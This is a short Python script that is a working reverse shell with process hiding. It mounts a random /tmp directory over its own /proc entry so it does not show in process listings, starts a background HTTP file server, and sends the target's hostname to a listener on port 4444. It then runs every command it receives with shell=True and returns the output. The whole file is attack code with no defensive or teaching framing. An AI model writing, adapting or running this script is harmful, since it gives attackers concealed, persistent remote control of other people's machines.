#!/bin/python3
import time,socket,subprocess,os,string
import random as r
    # ranadom process name
ch = string.ascii_lowercase + string.digits
token = "".join(r.choice(ch) for i in range(6))
    #pid and hidden process 
pid = os.getpid()
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token))
    # target hostname
hostname = "\nName Of Target Host: \t" + str(socket.gethostname()) + "\n"
    # reverse shell ip and port
HOST = '127.0.0.1'
PORT = 4444
command = os.system('python -m http.server 8000 &')
def Makeconnection(H,P,hostname):
    try:
        time.sleep(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((H,P))
        s.sendall(b'\n [+][+] CONNECTION IS ESTABLISHED [+][+] \n')
        s.sendto(hostname.encode(),(H,P))
        while 1:
            s.sendall(b'SHELL@HOST >>')
            data =s.recv(1024)
            proc = subprocess.Popen(data,shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE, stdout=subprocess.PIPE )
            stdout_value = proc.stdout.read() + proc.stderr.read()
            s.send(stdout_value)
    except socket.error:
        s.close()
while 1:
    Makeconnection(HOST,PORT,hostname)







